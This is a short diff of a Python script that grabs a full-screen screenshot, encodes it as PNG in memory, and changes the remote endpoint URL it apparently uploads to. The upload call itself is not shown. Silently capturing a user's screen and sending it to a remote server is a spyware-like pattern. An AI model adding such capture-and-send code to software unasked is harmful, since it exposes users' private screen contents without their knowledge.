@@ -2,7 +2,7 @@ import requests
 import PIL
 import io
 
-url = 'https://server.api/ss'
+url = 'https://server.api'
 screenshot = PIL.ImageGrab.grab()
 img_byte_arr = io.BytesIO()
 screenshot.save(img_byte_arr, format='PNG')
